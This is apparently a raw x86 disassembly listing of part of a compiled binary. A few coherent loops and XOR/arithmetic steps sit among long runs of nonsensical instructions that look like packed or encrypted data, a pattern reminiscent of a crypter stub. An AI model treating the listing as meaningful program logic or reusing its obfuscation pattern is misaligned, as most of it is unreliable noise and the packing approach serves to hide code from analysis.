  402925:	fidivr DWORD PTR [ebx]
  402927:	xor    dh,bh
  402929:	cld    
  40292a:	mov    al,al
  40292c:	jmp    0xbfcc:0x460977f2
  402933:	test   BYTE PTR [eax-0x17a18f77],dl
  402939:	push   ss
  40293a:	sbb    eax,0x4180df06
  40293f:	pushf  
  402940:	call   0xee98c669
  402945:	fwait
  402946:	dec    ebx
  402947:	add    al,0x2c
  402949:	jo     0x402939
  40294b:	ins    DWORD PTR es:[edi],dx
  40294c:	xor    al,0x43
  40294e:	xchg   edi,eax
  40294f:	pop    esp
  402950:	or     ecx,DWORD PTR ds:0x8d4e2395
  402956:	fcmovu st,st(0)
  402958:	std    
  402959:	mov    edi,0x9cbc34b6
  40295e:	sub    BYTE PTR [ebx-0x80],ch
  402961:	or     ch,BYTE PTR [edx-0x4c]
  402964:	dec    eax
  402965:	in     al,0x3a
  402967:	pop    esi
  402968:	leave  
  402969:	ret    0x4
  40296c:	push   ebp
  40296d:	mov    ebp,esp
  40296f:	sub    esp,0x28
  402972:	leave  
  402973:	ret    0x10
  402976:	push   ebp
  402977:	mov    ebp,esp
  402979:	push   ecx
  40297a:	or     eax,DWORD PTR ds:0x42fcdd
  402980:	push   ecx
  402981:	movzx  edx,WORD PTR ds:0x42e6ef
  402988:	sbb    DWORD PTR ds:0x42e713,edx
  40298e:	mov    eax,0xf89c8531
  402993:	mov    DWORD PTR ds:0x42fce9,0x1a
  40299d:	cmp    DWORD PTR ds:0x42fce9,0x0
  4029a4:	je     0x402a39
  4029aa:	cmp    DWORD PTR ds:0x42fce9,0x24
  4029b1:	jne    0x4029cc
  4029b7:	push   0x42e12c
  4029bc:	push   0x42e703
  4029c1:	push   0x59d6
  4029c6:	call   DWORD PTR ds:0x42e44f
  4029cc:	mov    edx,DWORD PTR ds:0x42fce9
  4029d2:	dec    edx
  4029d3:	mov    DWORD PTR ds:0x42fce9,edx
  4029d9:	jmp    0x40299d
  4029de:	mov    DWORD PTR ds:0x42e6ff,0x19
  4029e8:	cmp    DWORD PTR ds:0x42e6ff,0x0
  4029ef:	je     0x402a39
  4029f5:	cmp    DWORD PTR ds:0x42e6ff,0x4
  4029fc:	jne    0x402a0d
  402a02:	push   0x5bc5
  402a07:	call   DWORD PTR ds:0x42e2d3
  402a0d:	cmp    DWORD PTR ds:0x42e6ff,0x5
  402a14:	jne    0x402a27
  402a1a:	mov    edx,DWORD PTR ds:0x42e6ff
  402a20:	dec    edx
  402a21:	mov    DWORD PTR ds:0x42e6ff,edx
  402a27:	mov    edx,DWORD PTR ds:0x42e6ff
  402a2d:	dec    edx
  402a2e:	mov    DWORD PTR ds:0x42e6ff,edx
  402a34:	jmp    0x4029e8
  402a39:	mov    DWORD PTR [ebp-0x8],eax
  402a3c:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  402a43:	mov    edx,DWORD PTR [ebp-0x8]
  402a46:	mov    ecx,DWORD PTR ds:0x42fdae
  402a4c:	mov    ecx,DWORD PTR [ecx]
  402a4e:	xor    DWORD PTR ds:0x42fcd5,ecx
  402a54:	push   esi
  402a55:	mov    ecx,0x7510855
  402a5a:	or     DWORD PTR ds:0x42fd0d,ebx
  402a60:	xor    edx,ecx
  402a62:	sbb    esi,0x5361
  402a68:	mov    esi,0x32729c
  402a6d:	sbb    DWORD PTR ds:0x42e128,0x657d
  402a77:	push   edi
  402a78:	and    DWORD PTR ds:0x42e128,0x0
  402a82:	jmp    0x402a94
  402a87:	mov    edi,DWORD PTR ds:0x42e128
  402a8d:	inc    edi
  402a8e:	mov    DWORD PTR ds:0x42e128,edi
  402a94:	cmp    DWORD PTR ds:0x42e128,0x10
  402a9b:	jae    0x402abe
  402aa1:	cmp    DWORD PTR ds:0x42e128,0x11
  402aa8:	jne    0x402ab9
  402aae:	push   0x42e141
  402ab3:	call   DWORD PTR ds:0x42e453
  402ab9:	jmp    0x402a87
  402abe:	mov    edi,DWORD PTR [ebp+0x10]
  402ac1:	add    edx,esi
  402ac3:	cmp    edi,edx
  402ac5:	je     0x4036ba
  402acb:	mov    edx,DWORD PTR [ebp-0x8]
  402ace:	mov    eax,DWORD PTR [ebp-0x4]
  402ad1:	xor    eax,ecx
  402ad3:	mov    edi,0xffcd8d64
  402ad8:	sub    edi,eax
  402ada:	add    edi,DWORD PTR [ebp+0x10]
  402add:	xor    edx,ecx
  402adf:	jmp    0x402dbe
  402ae4:	imul   ebx,DWORD PTR [edx],0xffffff8f
  402ae7:	cmp    BYTE PTR [ebp+0x71],cl
  402aea:	jae    0x402a9d
  402aec:	jl     0x402b40
  402aee:	dec    esi
  402aef:	mov    esp,0x15a90717
  402af4:	jo     0x402b02
  402af6:	jo     0x402b68
  402af8:	mov    esi,0xaf70707e
  402afd:	(bad)  
  402afe:	icebp  
  402aff:	jmp    0xc1c5:0xdb222230
  402b06:	add    DWORD PTR [edi-0x32],esi
  402b09:	mov    ebp,0x7dbe3881
  402b0e:	sbb    eax,0xa127cea0
  402b14:	pop    esi
  402b15:	cs in  eax,dx
  402b17:	mov    ebx,0x7e134343
  402b1c:	les    esi,FWORD PTR [esi+0x5cbf0d9d]
  402b22:	in     al,0x4a
  402b24:	test   DWORD PTR [eax+0x56648cbf],esp
  402b2a:	sub    eax,0x30a3d776
  402b2f:	add    eax,0x949d7111
  402b34:	cli    
  402b35:	cmp    edi,edi
  402b37:	aaa    
  402b38:	cmp    esp,eax
  402b3a:	cmp    ch,0x31
  402b3d:	std    
  402b3e:	mov    bl,0xa0
  402b40:	mov    ds:0x955c1794,eax
  402b45:	or     eax,0x315500e9
  402b4a:	or     al,0xae
  402b4c:	jp     0x402b0d
  402b4e:	mul    BYTE PTR [esi*8+0x13fdc58c]
  402b55:	push   esp
  402b56:	sub    BYTE PTR [esi+0x32],dl
  402b59:	fwait
  402b5a:	push   ebp
  402b5b:	push   esp
  402b5c:	ins    DWORD PTR es:[edi],dx
  402b5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b5e:	mov    ds:0xcc5aa112,eax
  402b63:	ins    BYTE PTR es:[edi],dx
  402b64:	sbb    BYTE PTR [ebp+0x64fb0ba3],dh
  402b6a:	jno    0x402b55
  402b6c:	mov    ecx,0x17d26cda
  402b71:	mov    edx,DWORD PTR [eax-0x2e]
  402b74:	mov    ebx,edx
  402b76:	push   esp
  402b77:	(bad)  
  402b78:	js     0x402b87
  402b7a:	adc    al,0x66
  402b7c:	adc    al,0x24
  402b7e:	pop    es
  402b7f:	adc    cl,ch
  402b81:	les    edx,FWORD PTR [ecx-0x1ab9f1a3]
  402b87:	mov    esp,DWORD PTR [ebx]
  402b89:	push   esp
  402b8a:	xlat   BYTE PTR ds:[ebx]
  402b8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b8c:	into   
  402b8d:	nop
  402b8e:	inc    edx
  402b8f:	jecxz  0x402bb7
  402b91:	(bad)  [esi+0x69279ac7]
  402b97:	arpl   WORD PTR ds:0x69a95c65,cx
  402b9d:	pop    ebx
  402b9e:	(bad)  
  402b9f:	addr16 xchg edi,eax
  402ba1:	xchg   ecx,eax
  402ba2:	cdq    
  402ba3:	sub    BYTE PTR [esi+0x782b5bf3],0xea
  402baa:	mov    BYTE PTR [ebp-0x6],ah
  402bad:	es inc eax
  402baf:	xchg   DWORD PTR ds:0x2c03b678,edx
  402bb5:	xchg   esp,eax
  402bb6:	jae    0x402c09
  402bb8:	hlt    
  402bb9:	push   ebx
  402bba:	dec    ebx
  402bbb:	and    ecx,ebx
  402bbd:	add    DWORD PTR [ebx-0x15],edi
  402bc0:	sbb    BYTE PTR [ebx-0x2a50829f],bl
  402bc6:	jb     0x402b94
  402bc8:	ja     0x402c16
  402bca:	addr16 pop ebx
  402bcc:	je     0x402b92
  402bce:	and    al,0x36
  402bd0:	test   bl,al
  402bd2:	out    0x74,eax
  402bd4:	clc    
  402bd5:	nop
  402bd6:	(bad)  
  402bd7:	out    dx,al
  402bd8:	mov    ebx,0xef0aa7df
  402bdd:	mov    bh,0xd9
  402bdf:	adc    ecx,DWORD PTR ds:0x2f51b001
  402be5:	addr16 daa 
  402be7:	hlt    
  402be8:	int3   
  402be9:	int3   
  402bea:	pop    ds
  402beb:	clc    
  402bec:	in     al,dx
  402bed:	add    al,0x54
  402bef:	dec    ebx
  402bf0:	mov    ch,0xfe
  402bf2:	scas   al,BYTE PTR es:[edi]
  402bf3:	(bad)  
  402bf5:	into   
  402bf6:	leave  
  402bf7:	xchg   edx,eax
  402bf8:	add    eax,0x55f590f7
  402bfd:	sub    al,0x28
  402bff:	scas   eax,DWORD PTR es:[edi]
  402c00:	push   ss
  402c01:	or     al,0xf7
  402c03:	pop    eax
  402c04:	jmp    0x4982e982
  402c09:	lock cmp DWORD PTR [edx-0x35ff9826],ebx
  402c10:	jns    0x402c27
  402c12:	mov    dh,0x98
  402c14:	jno    0x402ba4
  402c16:	ins    DWORD PTR es:[edi],dx
  402c17:	cdq    
  402c18:	repz mul BYTE PTR [edi+0x73]
  402c1c:	push   esp
  402c1d:	inc    edi
  402c1e:	sbb    DWORD PTR [esi+edx*4],ecx
  402c21:	cld    
  402c22:	sbb    eax,0xaba2876e
  402c27:	test   BYTE PTR [ebp-0x76d505d8],bh
  402c2d:	aaa    
  402c2e:	iret   
  402c2f:	adc    eax,0xfbb7dda
  402c34:	in     eax,0x48
  402c36:	in     eax,0x23
  402c38:	pop    esp
  402c39:	ror    ebp,cl
  402c3b:	sbb    eax,0xbea8eb8
  402c40:	pop    edi
  402c41:	mov    edx,DWORD PTR [esi+0xe12c43f]
  402c47:	mov    DWORD PTR [eax+0x29],esp
  402c4a:	cmc    
  402c4b:	hlt    
  402c4c:	push   ds
  402c4d:	cli    
  402c4e:	es pop ebx
  402c50:	fld    TBYTE PTR [ebx]
  402c52:	mov    eax,ds:0x67aa9973
  402c57:	dec    eax
  402c58:	adc    BYTE PTR es:[ecx-0x38b66501],dh
  402c5f:	cld    
  402c60:	shl    BYTE PTR [ebx+0x1a16e303],0xaa
  402c67:	xchg   ecx,eax
  402c68:	retf   0x494a
  402c6b:	mov    ecx,0xa455866d
  402c70:	lds    ecx,FWORD PTR [eax]
  402c72:	or     al,0xde
  402c74:	cmp    edx,eax
  402c76:	adc    BYTE PTR [ebx-0x75c69fd],bh
  402c7c:	cmp    DWORD PTR [edx+0xe],0x61
  402c80:	mov    eax,0x47f98e3b
  402c85:	pop    eax
  402c86:	test   al,0x2b
  402c88:	push   0x94058e32
  402c8d:	(bad)  
  402c8e:	retf   0xae30
  402c91:	xchg   esi,eax
  402c92:	mov    edi,0x3fb800d5
  402c97:	push   ecx
  402c98:	test   eax,0x44c0e7fe
  402c9d:	jecxz  0x402c64
  402c9f:	pop    eax
  402ca0:	sub    ah,cl
  402ca2:	das    
  402ca3:	xchg   ecx,eax
  402ca4:	pop    edx
  402ca5:	xchg   BYTE PTR [esi+0x69487b98],bl
  402cab:	mov    ch,0x5d
  402cad:	adc    ah,BYTE PTR [edx]
  402caf:	jae    0x402d26
  402cb1:	adc    bl,al
  402cb3:	mov    al,0x5a
  402cb5:	or     esi,DWORD PTR [edi]
  402cb7:	pushf  
  402cb8:	jle    0x402d02
  402cba:	xor    esi,DWORD PTR [ebp-0x14]
  402cbd:	(bad)  
  402cbe:	mov    ebp,0x2fc7439f
  402cc3:	sbb    al,0x50
  402cc5:	push   esp
  402cc6:	push   esp
  402cc7:	xchg   esp,eax
  402cc9:	in     al,dx
  402cca:	out    0x4,eax
  402ccc:	pop    ecx
  402ccd:	jbe    0x402cab
  402ccf:	fist   WORD PTR [eax+0x7e69c646]
  402cd5:	xchg   ebp,eax
  402cd6:	push   DWORD PTR [edi+0x578f1d37]
  402cdc:	jecxz  0x402cb3
  402cde:	sbb    ebx,ebp
  402ce0:	stos   BYTE PTR es:[edi],al
  402ce1:	sub    DWORD PTR [eax],ecx
  402ce3:	or     BYTE PTR [ebp-0x13a23cf5],al
  402ce9:	in     al,0x47
  402ceb:	mov    dh,BYTE PTR [ebp+0x15]
  402cee:	popf   
  402cef:	test   al,0x3d
  402cf1:	daa    
  402cf2:	sub    edx,DWORD PTR [edi-0x64]
  402cf5:	or     eax,0x10280f53
  402cfa:	dec    edi
  402cfb:	add    DWORD PTR [eax],edi
  402cfd:	pop    ss
  402cfe:	xor    BYTE PTR [ebp+0x4d3f285],al
  402d04:	sub    dh,ah
  402d06:	shl    BYTE PTR [edx+edx*2+0x3215e9dc],0xcf
  402d0e:	ins    DWORD PTR es:[edi],dx
  402d0f:	or     eax,0xde2b706f
  402d14:	mov    dl,0x4a
  402d16:	rcr    DWORD PTR ds:0x40285ed4,cl
  402d1c:	lock not DWORD PTR [edx-0x75]
  402d20:	fst    QWORD PTR [edx+0x36890cf5]
  402d26:	loopne 0x402d72
  402d28:	inc    edi
  402d29:	pop    ecx
  402d2a:	mov    cl,0xd5
  402d2c:	popf   
  402d2d:	mov    esi,0x4d171862
  402d32:	ds test dl,al
  402d35:	mov    ebp,0x87a272c2
  402d3a:	repz pop eax
  402d3c:	push   esp
  402d3d:	retf   0x1f
  402d40:	(bad)  
  402d41:	out    0x5e,al
  402d43:	into   
  402d44:	in     eax,dx
  402d45:	mov    ds:0xdbb5800c,eax
  402d4a:	dec    esi
  402d4b:	out    dx,al
  402d4c:	push   eax
  402d4d:	enter  0xb7da,0x84
  402d51:	adc    ebp,DWORD PTR [edi]
  402d53:	outs   dx,DWORD PTR ds:[esi]
  402d54:	call   0x7eb63ff4
  402d59:	stc    
  402d5a:	in     al,dx
  402d5b:	sbb    bl,cl
  402d5d:	imul   ebp,esp,0x35093ded
  402d63:	imul   ebx,edx,0x5d
  402d66:	push   es
  402d67:	in     al,0xab
  402d69:	xchg   ecx,eax
  402d6a:	sbb    DWORD PTR [ebx-0x40],ebp
  402d6d:	mov    ah,0xd6
  402d6f:	call   0x4f90c00b
  402d74:	aad    0x48
  402d76:	out    dx,eax
  402d77:	movzx  edi,WORD PTR [esi]
  402d7a:	dec    ebp
  402d7b:	fs jp  0x402d7f
  402d7e:	lahf   
  402d7f:	xchg   edi,eax
  402d80:	dec    edi
  402d81:	mov    esp,0xdd09bebf
  402d86:	push   edi
  402d87:	mov    dh,BYTE PTR ds:0x2d017ddd
  402d8d:	cmp    BYTE PTR [ecx+0x1c95cb40],dl
  402d93:	dec    esi
  402d94:	(bad)  
  402d95:	sti    
  402d96:	es sbb eax,edi
  402d99:	jnp    0x402d73
  402d9b:	stos   DWORD PTR es:[edi],eax
  402d9c:	out    0x48,eax
  402d9e:	out    0xa0,eax
  402da0:	jl     0x402e16
  402da2:	adc    eax,0x1b9c7a3c
  402da7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402da8:	scas   al,BYTE PTR es:[edi]
  402da9:	out    0x6b,al
  402dab:	or     BYTE PTR [edi-0x10],al
  402dae:	dec    eax
  402daf:	in     eax,0x41
  402db1:	sbb    eax,0x76185530
  402db6:	fbstp  TBYTE PTR [eax+ecx*8+0x15]
  402dba:	bound  eax,QWORD PTR [ecx]
  402dbc:	xchg   ebp,eax
  402dbd:	jmp    0x870f:0xd73bd603
  402dc4:	in     eax,dx
  402dc5:	or     BYTE PTR [eax],al
  402dc7:	add    BYTE PTR [ebx-0x17],dl
  402dca:	in     al,0x2
  402dcc:	add    BYTE PTR [eax],al
  402dce:	jmp    0x4030ad
  402dd3:	mov    ecx,0xe1afe4fc
  402dd8:	ja     0x402e2b
  402dda:	push   0xffffffa6
  402ddc:	aas    
  402ddd:	xchg   ebp,eax
  402dde:	out    dx,eax
  402ddf:	sub    al,0x96
  402de1:	fs push esi
  402de3:	mov    esi,0xbe70700a
  402de8:	jle    0x402e5a
  402dea:	jo     0x402d7a
  402dec:	test   eax,0x1cbeb1e2
  402df1:	stos   DWORD PTR es:[edi],eax
  402df2:	mov    ds,WORD PTR [edx]
  402df4:	pop    edi
  402df5:	xchg   edi,eax
  402df6:	popf   
  402df7:	and    eax,0xf6fe21c7
  402dfc:	adc    edi,DWORD PTR [esi-0x78]
  402dff:	xor    eax,0xb1060a6d
  402e04:	inc    edx
  402e05:	inc    ebx
  402e06:	push   ds
  402e07:	test   al,0xeb
  402e09:	pop    es
  402e0a:	or     al,0x70
  402e0c:	sahf   
  402e0d:	pop    ss
  402e0e:	or     esi,esi
  402e10:	jmp    0x4b87:0xc02ccfaa
  402e17:	mov    bl,bl
  402e19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e1a:	and    cl,BYTE PTR [ebp-0xb266ff8]
  402e20:	cmp    BYTE PTR [ecx+0x7f],ch
  402e23:	pushf  
  402e24:	xchg   ebp,eax
  402e25:	ja     0xed36d643
  402e2b:	loope  0x402e5b
  402e2d:	pop    esi
  402e2e:	ficomp DWORD PTR [edi]
  402e30:	and    esi,DWORD PTR [edx-0x24]
  402e33:	out    0x82,al
  402e35:	mov    eax,0x72e7494d
  402e3a:	imul   esi,DWORD PTR [ecx+0x18fb21f8],0x49
  402e41:	arpl   WORD PTR [ecx+0x2d],dx
  402e44:	jbe    0x402e9b
  402e46:	in     al,dx
  402e47:	pop    esi
  402e48:	xor    edi,ecx
  402e4a:	xchg   DWORD PTR [eax],ebx
  402e4c:	pop    esi
  402e4d:	out    dx,eax
  402e4e:	mov    edx,0xb9adc2f
  402e53:	mov    ebp,0x4e0cb9be
  402e58:	mov    ecx,0xf6e2eae9
  402e5d:	and    al,0x6e
  402e5f:	mov    ebx,0x73089e36
  402e64:	pop    esi
  402e65:	pop    ds
  402e66:	(bad)  
  402e67:	jo     0x402ea5
  402e69:	cmp    ebx,DWORD PTR [edx+ebp*4]
  402e6c:	sti    
  402e6d:	push   ebp
  402e6e:	mov    edx,0xab9bdd59
  402e73:	mov    ah,0xc9
  402e75:	add    dh,cl
  402e77:	imul   ecx,DWORD PTR [edi-0x6d],0x7b1bb26e
  402e7e:	gs mov ebx,0xe939b29e
  402e84:	jo     0x402e92
  402e86:	test   eax,0xddad3a5
  402e8b:	mov    ds:0xb7457ee6,al
  402e90:	les    edx,FWORD PTR [edx]
  402e92:	xchg   DWORD PTR [edi],esi
  402e94:	in     eax,dx
  402e95:	and    ecx,ecx
  402e97:	mov    al,ds:0xe6dc2099
  402e9c:	xlat   BYTE PTR ds:[ebx]
  402e9d:	cli    
  402e9e:	cmp    DWORD PTR [eax],eax
  402ea0:	mov    ebx,0xebca170a
  402ea5:	adc    BYTE PTR [eax-0x11],ah
  402ea8:	mov    dl,0x11
  402eaa:	and    DWORD PTR [edx+0x5],ebx
  402ead:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402eae:	and    BYTE PTR [esi],dl
  402eb0:	aad    0x59
  402eb2:	mov    ah,BYTE PTR [ebx]
  402eb4:	pop    edx
  402eb5:	adc    eax,0xb8c60802
  402eba:	mov    ah,0x1d
  402ebc:	int    0x8f
  402ebe:	jne    0x402e95
  402ec0:	xor    al,0x7c
  402ec2:	dec    ecx
  402ec3:	outs   dx,DWORD PTR ds:[esi]
  402ec4:	jle    0x402eab
  402ec6:	nop
  402ec7:	jp     0x402eed
  402ec9:	cld    
  402eca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ecb:	ret    
  402ecc:	and    ah,0xa2
  402ecf:	out    0xc,eax
  402ed1:	mov    DWORD PTR [ecx],ecx
  402ed3:	(bad)  
  402ed4:	addr16 and eax,0xee6e2395
  402eda:	clc    
  402edb:	pop    esp
  402edc:	(bad)  
  402edd:	aad    0x2d
  402edf:	adc    ebx,DWORD PTR [eax+0x70]
  402ee2:	in     eax,dx
  402ee3:	lods   eax,DWORD PTR ds:[esi]
  402ee4:	inc    edx
  402ee5:	sub    al,0x7d
  402ee7:	dec    esp
  402ee8:	arpl   WORD PTR [eax+0x45124f37],ax
  402eee:	pushf  
  402eef:	loopne 0x402ee1
  402ef1:	cs dec edi
  402ef3:	aaa    
  402ef4:	bound  ebx,QWORD PTR [ecx+0x49faedf6]
  402efa:	sbb    bl,BYTE PTR [esi+ecx*2-0x9]
  402efe:	sbb    esp,DWORD PTR [edx-0x3507575c]
  402f04:	jl     0x402f37
  402f06:	and    eax,0x30c64869
  402f0b:	xchg   edx,eax
  402f0c:	and    DWORD PTR ss:[edx-0x2d821b0f],edi
  402f13:	les    edx,FWORD PTR [ebp+0x67]
  402f16:	stos   DWORD PTR es:[edi],eax
  402f17:	sti    
  402f18:	shr    DWORD PTR [ecx-0x695919ca],0xc3
  402f1f:	inc    ebp
  402f20:	jge    0x402f75
  402f22:	xchg   esp,eax
  402f23:	ds add ch,cl
  402f26:	imul   eax,DWORD PTR [esi+esi*1-0x4f1b9cb7],0xffffffae
  402f2e:	jne    0x402f0d
  402f30:	add    BYTE PTR [esi],bh
  402f32:	adc    BYTE PTR [ebx-0x22a8e1c6],0xae
  402f39:	push   esi
  402f3a:	inc    edi
  402f3b:	pop    ecx
  402f3c:	push   ds
  402f3d:	xlat   BYTE PTR ds:[ebx]
  402f3e:	jo     0x402ef5
  402f40:	mov    ebx,0x8912a688
  402f45:	(bad)  
  402f46:	retf   0xef6a
  402f49:	sbb    DWORD PTR [edi-0x77d2b4ea],edx
  402f4f:	dec    ebx
  402f50:	cld    
  402f51:	push   ebp
  402f52:	inc    eax
  402f53:	fidiv  WORD PTR [esi]
  402f55:	ins    BYTE PTR es:[edi],dx
  402f56:	cld    
  402f57:	cmc    
  402f58:	pop    ss
  402f59:	(bad)  
  402f5a:	mov    bl,BYTE PTR [esp+edx*1+0x37a2eb39]
  402f61:	js     0x402f00
  402f63:	adc    eax,0x704509d5
  402f68:	repz or edi,DWORD PTR ds:0x2d53490a
  402f6f:	idiv   DWORD PTR [ecx+ebp*2+0x894d84c]
  402f76:	cwde   
  402f77:	xchg   bh,al
  402f79:	or     ah,BYTE PTR [ebx+eax*1-0x5]
  402f7d:	and    BYTE PTR [edx+0x6a97ea33],ch
  402f83:	mov    ?,WORD PTR [edi-0x33]
  402f86:	push   edi
  402f87:	stos   BYTE PTR es:[edi],al
  402f88:	ret    0xf1e5
  402f8b:	or     al,0xf5
  402f8d:	dec    esi
  402f8e:	ror    eax,1
  402f90:	pop    eax
  402f91:	sbb    ch,BYTE PTR [edx-0x6135599e]
  402f97:	adc    al,0xa0
  402f99:	add    ah,ch
  402f9b:	mov    edx,0xaf463a89
  402fa0:	pop    es
  402fa1:	xor    dl,BYTE PTR [ebx-0x5a]
  402fa4:	sub    al,bl
  402fa6:	fild   WORD PTR [edx-0x35b7c796]
  402fac:	sahf   
  402fad:	push   edx
  402fae:	mov    edx,?
  402fb0:	ss ret 
  402fb2:	sti    
  402fb3:	lock outs dx,BYTE PTR ds:[esi]
  402fb5:	xor    DWORD PTR cs:[edi-0x6],esp
  402fb9:	add    esp,DWORD PTR [eax-0x5890e748]
  402fbf:	adc    ch,0x73
  402fc2:	push   0x3b8643f
  402fc7:	xchg   ecx,eax
  402fc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fc9:	or     BYTE PTR [eax+0x60],0x9b
  402fcd:	xchg   ebp,eax
  402fce:	test   DWORD PTR [esi],edx
  402fd0:	mov    esi,0xbf1ad7a9
  402fd5:	cmp    esi,DWORD PTR [ebp+0x2dba0ef4]
  402fdb:	in     al,0x81
  402fdd:	push   ss
  402fde:	push   esi
  402fdf:	icebp  
  402fe0:	or     dl,ch
  402fe2:	(bad)  
  402fe5:	out    dx,eax
  402fe6:	mov    ch,0x96
  402fe8:	js     0x402f81
  402fea:	fidiv  DWORD PTR [ecx]
  402fec:	dec    ebx
  402fed:	cli    
  402fee:	sub    al,BYTE PTR [esi]
  402ff0:	push   cs
  402ff1:	leave  
  402ff2:	aad    0x25
  402ff4:	dec    DWORD PTR [esi]
  402ff6:	inc    esi
  402ff7:	int    0x8
  402ff9:	inc    ecx
  402ffa:	rcl    al,1
  402ffc:	push   esp
  402ffd:	ins    BYTE PTR es:[di],dx
  402fff:	mov    eax,ds:0xd2e00a4c
  403004:	cwde   
  403005:	retf   
  403006:	int3   
  403007:	cmc    
  403008:	aad    0xd1
  40300a:	pop    ebp
  40300b:	pop    esi
  40300c:	pop    ds
  40300d:	xor    esp,DWORD PTR [ebx+eiz*1+0x266d3bbf]
  403014:	pop    edx
  403015:	ss pop ss
  403017:	cmp    BYTE PTR [eax],dl
  403019:	lahf   
  40301a:	fwait
  40301b:	les    edx,FWORD PTR [ecx]
  40301d:	jae    0x40307f
  40301f:	xchg   ebx,eax
  403020:	icebp  
  403021:	sbb    esp,DWORD PTR [ebp+esi*2-0x3f51d017]
  403028:	push   esi
  403029:	rol    BYTE PTR [edx],cl
  40302b:	es cli 
  40302d:	stos   DWORD PTR es:[edi],eax
  40302e:	pop    eax
  40302f:	iret   
  403030:	mov    es,WORD PTR [edi-0x5919daa2]
  403036:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403037:	xor    DWORD PTR [ebx-0x50],ecx
  40303a:	sbb    BYTE PTR [ecx+0x37],al
  40303d:	cmp    bl,BYTE PTR [edi+ebp*8-0x2d]
  403041:	push   ebp
  403042:	jmp    0x27b098e7
  403047:	adc    dh,BYTE PTR [eax]
  403049:	loop   0x402fdb
  40304b:	push   esp
  40304c:	aaa    
  40304d:	jmp    0x970b14
  403052:	mov    BYTE PTR [edx-0x43],bh
  403055:	int    0x7c
  403057:	jns    0x4030a2
  403059:	call   0x228b02c6
  40305e:	push   edx
  40305f:	ss stos DWORD PTR es:[edi],eax
  403061:	xlat   BYTE PTR ds:[ebx]
  403062:	and    esp,DWORD PTR cs:[edx]
  403065:	jnp    0x4030a0
  403067:	cld    
  403068:	test   al,0x61
  40306a:	(bad)  
  40306b:	(bad)  
  40306c:	adc    ebx,ebx
  40306e:	push   esp
  40306f:	iret   
  403070:	pop    edi
  403071:	dec    esp
  403072:	adc    esp,ecx
  403074:	push   0xffffff95
  403076:	jno    0x4030bd
  403078:	lock sbb BYTE PTR [edi+0x8ef62aa],dh
  40307f:	pusha  
  403080:	adc    edi,DWORD PTR [eax+0x3f]
  403083:	js     0x403100
  403085:	push   0x665751a7
  40308a:	test   DWORD PTR [ebp-0x18eae0cf],edx
  403090:	out    dx,eax
  403091:	add    DWORD PTR [ebp-0x2c],ebp
  403094:	shl    BYTE PTR [edi],1
  403096:	test   DWORD PTR ds:0xa4500302,edx
  40309c:	fmul   QWORD PTR [esi-0x70]
  40309f:	fild   DWORD PTR [edx+0xb79a31d]
  4030a5:	aam    0x63
  4030a7:	test   BYTE PTR [edi+0x41c6899d],cl
  4030ad:	mov    esi,0x32729c
  4030b2:	mov    eax,DWORD PTR [ebp-0x8]
  4030b5:	mov    edi,DWORD PTR [ebp-0x4]
  4030b8:	xor    edi,ecx
  4030ba:	add    edi,esi
  4030bc:	jmp    0x40339b
  4030c1:	fist   DWORD PTR [ecx+0x4b76cc16]
  4030c7:	loope  0x40307a
  4030c9:	lds    edx,FWORD PTR [esi-0x42]
  4030cc:	add    al,0xf7
  4030ce:	(bad)  [ebx-0x60]
  4030d1:	cld    
  4030d2:	pop    ss
  4030d3:	jo     0x403145
  4030d5:	mov    esi,0x7770707e
  4030da:	cmp    eax,0x2e588bae
  4030df:	sbb    esp,DWORD PTR [edx]
  4030e1:	inc    edi
  4030e2:	pusha  
  4030e3:	add    edx,DWORD PTR [edx-0x20d0194c]
  4030e9:	div    BYTE PTR [eax+0x68ee9bb]
  4030ef:	pop    eax
  4030f0:	scas   eax,DWORD PTR es:[edi]
  4030f1:	cmc    
  4030f2:	xchg   edi,esi
  4030f4:	jp     0x4030e0
  4030f6:	or     BYTE PTR [edi+edi*4+0x7a],ch
  4030fa:	adc    dh,ah
  4030fc:	out    dx,eax
  4030fd:	jo     0x4030c3
  4030ff:	mov    edx,DWORD PTR [ebp+0x46993bf2]
  403105:	sbb    esp,DWORD PTR [edx]
  403107:	xor    edx,DWORD PTR [edx-0x371df6f4]
  40310d:	and    ebp,ebx
  40310f:	cmp    ch,al
  403111:	push   ebp
  403112:	cmp    BYTE PTR [ebp+0x2a],0xaa
  403116:	push   ecx
  403117:	loope  0x403105
  403119:	jp     0x40319a
  40311b:	shr    BYTE PTR [ebp-0x53],cl
  40311e:	shl    DWORD PTR [ecx],1
  403120:	fcom   DWORD PTR [edi-0x1e]
  403123:	xchg   esp,eax
  403124:	add    al,BYTE PTR [ebx]
  403126:	jns    0x403174
  403128:	out    dx,eax
  403129:	push   0xffffffcf
  40312b:	retf   0x8b85
  40312e:	imul   DWORD PTR [eax+0x5fa194]
  403134:	push   edx
  403135:	inc    ecx
  403136:	xchg   ebx,eax
  403137:	xchg   esi,eax
  403139:	jl     0x40316e
  40313b:	fsubr  DWORD PTR [ebx+eiz*8]
  40313e:	aad    0x71
  403140:	std    
  403141:	int3   
  403142:	inc    ecx
  403143:	jge    0x4030e1
  403145:	sub    edi,DWORD PTR [ebp+0xb]
  403148:	je     0x4031ae
  40314a:	add    eax,0xfd10dfc3
  40314f:	adc    dl,dl
  403151:	and    DWORD PTR [ebx+0x39],0x8581dd18
  403158:	pop    esi
  403159:	pushf  
  40315a:	adc    BYTE PTR gs:[ebx+0x8],dh
  40315e:	jae    0x40319c
  403160:	cmc    
  403161:	mov    WORD PTR [ebp-0x37],?
  403164:	lods   eax,DWORD PTR ds:[esi]
  403165:	in     eax,dx
  403166:	(bad)  
  403167:	jae    0x403109
  403169:	ins    DWORD PTR es:[edi],dx
  40316a:	jns    0x4031a9
  40316c:	mov    ecx,0xa7419328
  403171:	xchg   esp,eax
  403172:	push   0xffffffad
  403174:	(bad)  
  403175:	dec    ecx
  403176:	or     al,0xa5
  403178:	scas   eax,DWORD PTR es:[edi]
  403179:	imul   ecx,DWORD PTR [edi-0x17d57bb6],0x482169cc
